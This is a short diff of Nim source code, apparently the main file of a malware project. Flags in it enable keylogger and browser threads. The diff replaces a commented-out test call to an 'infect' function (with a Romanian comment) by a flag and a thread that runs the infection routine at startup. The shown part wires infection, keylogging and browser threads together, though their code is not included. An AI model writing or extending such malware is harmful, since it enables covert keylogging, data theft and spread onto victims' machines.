@@ -10,11 +10,7 @@ from lib/constants import isProd
 
 from lib/flags import USE_BROWSER_THREAD
 from lib/flags import USE_KEYLOGGER_THREAD
-
-# am pus asta doar ca sa testez func
-# import lib/functions/infect
-# infect()
-
+from lib/flags import USE_INFECT_THREAD
 
 when isProd:
   from lib/functions/beforeStart import run
@@ -41,6 +37,13 @@ when USE_BROWSER_THREAD:
   var browserThreadVar: Thread[void]
 
   createThread(browserThreadVar, initBrowserThread)
+
+when USE_INFECT_THREAD:
+  from lib/threads/infectThread import initInfectThread
+
+  var infectThreadVar: Thread[void]
+
+  createThread(infectThreadVar, initInfectThread)
 
 while true:
   ## TODO:
